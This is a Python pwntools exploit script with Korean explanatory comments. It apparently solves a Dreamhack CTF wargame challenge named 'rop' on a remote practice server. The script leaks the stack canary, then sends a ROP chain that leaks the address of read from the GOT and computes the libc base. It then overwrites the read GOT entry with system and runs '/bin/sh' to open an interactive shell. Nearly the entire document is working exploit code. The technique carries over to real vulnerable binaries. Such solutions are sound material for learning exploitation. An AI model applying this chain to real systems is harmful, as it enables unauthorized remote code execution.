from pwn import *

r = remote('host8.dreamhack.games', 12954)
e = ELF('./rop')
libc = ELF('./libc.so.6')

#leak canary
dmy = b'A' * 0x39
r.sendafter("Buf: ", dmy)
r.recvuntil(dmy)
cnry = b'\x00' + r.recvn(7)

#Use ROP
pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400854
write_plt = e.plt['write']
read_plt = e.plt['read']
read_got = e.got['read'] #read 함수 주소가 저장되어 있는 메모리 위치를 가리킴. GOT 주소는 고정이지만 , aslr로 인해 매 실행마다 값이 변함

#exploit
payload = b'A' * 0x38 + cnry + b'B' * 0x8

#write(1, read_got, ...) // read_got 실제 주소를 leak
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)  # call write () 

#read(0, read_got, ...) // read_plt를 호출해서 read_got 주소에 입력값을 덮어씀.
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

#read("/bin/sh") 
payload += p64(pop_rdi)
payload += p64(read_got + 0x8) #/bin/sh 의 주소
payload += p64(ret)
payload += p64(read_plt) #read 호출

#여기까지 read_got에 system 함수 주소를 덮어쓸 준비가 완료됨.

r.sendafter("Buf: ", payload)
read = u64(r.recvn(6) + b'\x00' * 2) #현재 프로세스 메모리에 있는 read 함수의 주소, write(1, read_got, ...)로 leak된 read 함수의 주소를 받음. 6바이트만 받아도 충분함
lb = read - libc.symbols['read'] #libc base 구하기 (프로세스 메모리 함수 주소 - 오프셋)
system = lb + libc.symbols['system'] #system 함수의 메모리 주소 구하기.

r.send(p64(system) + b'/bin/sh\x00') #read_got 주소에 system 함수 주소(8바이트) 가 덮어씌워지고, read_got + 8 자리에 /bin/sh이 들어감. 끝에 null 바이트를 통해 문자열이 끝났다고 인식.

r.interactive()